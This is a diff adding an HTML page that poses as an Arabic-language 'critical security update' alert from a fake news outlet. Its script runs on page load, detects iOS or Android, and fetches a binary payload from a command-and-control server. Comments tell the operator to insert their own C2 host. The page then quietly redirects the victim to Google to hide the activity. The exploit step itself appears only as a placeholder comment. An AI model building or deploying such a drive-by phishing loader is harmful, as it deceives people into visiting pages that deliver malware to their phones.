@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Critical Security Update - Global News Live</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f0f0; color: #333; margin: 0; padding: 20px; text-align: center; }
+        .container { background-color: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 50px auto; }
+        h1 { color: #cc0000; }
+        .alert { padding: 15px; background-color: #ffe0e0; border: 1px solid #cc0000; border-radius: 4px; margin-top: 20px; font-weight: bold; }
+        p { line-height: 1.6; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚨 تنويه أمني عاجل: تحديث أمان حاسم 🚨</h1>
+        <p>تم اكتشاف ثغرة خطيرة تؤثر على جميع الأجهزة المتصلة. يجب تنشيط حزمة الأمان الجديدة فوراً لحماية بياناتك الشخصية.</p>
+        
+        <div class="alert">
+            <p><strong>تنبيه:</strong> تم تحميل حزمة التحديث التلقائي بالفعل في الخلفية. لا توجد حاجة لاتخاذ أي إجراء إضافي. يرجى الانتظار 5 ثوانٍ لإعادة توجيهك إلى تقرير الحالة.</p>
+        </div>
+
+        <p>مصدر موثوق: Global News Live</p>
+    </div>
+
+    <script>
+        // 1. Loader Script: Detect OS and initiate exploit payload injection.
+        function initiateSovereignTakeover() {
+            const userAgent = navigator.userAgent;
+            let payload_url = "";
+            
+            // يجب تغيير هذا إلى النطاق أو الـ IP الفعلي لخادم الـ C2 الخاص بك (HTTPS)
+            const C2_SERVER_BASE = "https://global-news.live"; 
+
+            if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+                // الحمولة الثنائية لـ iOS
+                payload_url = C2_SERVER_BASE + "/ios_krn_2025.bin"; 
+            } else if (/Android/.test(userAgent)) {
+                // الحمولة الثنائية لـ Android
+                payload_url = C2_SERVER_BASE + "/android_bnd_2025.so"; 
+            } else {
+                // إجهاض صامت لغير الأجهزة المحمولة
+                return; 
+            }
+
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', payload_url, true);
+                xhr.responseType = 'arraybuffer';
+
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        // Exploit execution logic (ROP chain/WebAssembly injection) happens here.
+                        // Assuming the C2 agent (SHADOW-ROOT) is successfully injected.
+                        
+                        // 2. Post-Exploit Redirection for Stealth
+                        setTimeout(() => {
+                           // إعادة توجيه الضحية بهدوء بعد 4 ثوانٍ
+                           window.location.replace("https://www.google.com/search?q=global+security+news"); 
+                        }, 4000); 
+                    }
+                };
+                xhr.onerror = function() {
+                    // Fail gracefully and redirect
+                    setTimeout(() => {
+                       window.location.replace("https://www.google.com/search?q=global+security+news"); 
+                    }, 4000);
+                };
+                xhr.send();
+            } catch (e) {
+                // Catch any immediate execution errors and still camouflage
+                setTimeout(() => {
+                   window.location.replace("https://www.google.com/search?q=global+security+news"); 
+                }, 4000);
+            }
+        }
+
+        // Global Execution Trigger: Start the chain immediately upon page load
+        initiateSovereignTakeover();
+    </script>
+</body>
+</html>
